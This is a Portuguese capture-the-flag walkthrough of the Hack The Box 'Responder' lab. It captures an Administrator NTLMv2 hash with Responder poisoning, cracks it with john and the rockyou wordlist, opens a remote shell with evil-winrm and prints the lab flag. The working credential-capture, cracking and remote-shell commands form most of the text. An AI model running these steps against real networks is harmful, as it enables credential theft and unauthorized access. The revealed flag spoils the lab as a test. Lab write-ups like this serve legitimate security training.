Descobrindo IP da maquina para receber as credênciais do NTLM
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/responder]
└─$ ip add tun0

4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.134/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1184/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::7466:41c:b778:a064/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

Rodando o responder com a configuração customizada
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/responder]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

---

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.134]
    Responder IPv6             [dead:beef:2::1184]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-I0FSLQ7FG4Q]
    Responder Domain Name      [0WZK.LOCAL]
    Responder DCE-RPC Port     [49726]

[+] Listening for events...                                                                                                                                
```

Recebemos um hash!
```
[SMB] NTLMv2-SSP Client   : 10.129.191.65
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:bc2d001b9d39ad86:A1F00367267A6EFA7AC5BDD7BE7483FF:0101000000000000804FA1B8D822D9018E816360F77F7D7D0000000002000800300057005A004B0001001E00570049004E002D0049003000460053004C0051003700460047003400510004003400570049004E002D0049003000460053004C005100370046004700340051002E00300057005A004B002E004C004F00430041004C0003001400300057005A004B002E004C004F00430041004C0005001400300057005A004B002E004C004F00430041004C0007000800804FA1B8D822D9010600040002000000080030003000000000000000010000000020000013638F3131194BF51DD5BDC7F23EB209A32CB6A1F9AD71B76CC9C6089BF051C40A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330034000000000000000000
```

Descobrindo o dado criptografado usando `john`
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/responder]
└─$ sudo john -w=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-01-07 20:50) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Sabemos que a senha do `Administrador` é  `badminton`

Usando o `Evil-WinRM` criamos a shell para explorarmos a máquina 
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/responder]
└─$ evil-winrm -i 10.129.191.65 -u administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

Navegando um pouco entre os usuários do sistema, achamos a flag dentro da pasta do usuário `mike`
```
*Evil-WinRM* PS C:\Users\mike\Desktop> dir

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7##########################
```

Flag: `ea81b7afddd03efaa0945333ed147fac`